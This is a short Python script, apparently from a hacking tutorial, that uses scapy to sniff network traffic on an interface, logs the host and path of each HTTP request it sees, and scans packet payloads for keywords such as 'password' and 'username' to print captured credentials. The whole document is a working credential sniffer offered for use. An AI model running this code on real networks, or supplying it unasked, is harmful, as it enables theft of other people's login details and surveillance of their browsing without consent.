
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["password", "username", "pass", "user", "login", "uname"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = "[+] Webpage Visited >> " + str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)
        print(url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username and Password >> " + str(login_info) + "\n\n")



sniff("eth0")
